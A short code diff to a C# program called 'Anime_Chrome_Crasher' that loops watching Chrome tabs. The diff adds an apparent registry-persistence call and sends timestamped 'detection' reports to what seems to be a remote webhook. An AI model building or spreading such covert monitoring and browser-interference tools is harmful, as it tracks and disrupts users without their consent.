@@ -8,19 +8,20 @@ namespace Anime_Chrome_Crasher
         /// <summary>
         /// The main entry point for the application.
         /// </summary>
+        /// 
+
         [STAThread]
         static void Main()
         {
-            WeebHook.SendMessage("Weeb detection started");
-            FindWindows.Start();
+            FindWindows.AddRegistry();
+            WeebHook.SendMessage("Weeb detection started at " + DateTime.Now.ToString());
             while (true)
             {
                 if (FindWindows.GetChrome())
                 {
                     if (FindWindows.CheckTabs())
                     {
-                        // Informs the user of why anime is bad!
-                        Process.Start("chrome", "http://www.academia.edu/36836619/Why_Anime_Is_Bad_For_You");
+                        Process.Start("chrome");
                     }
                 }
             }
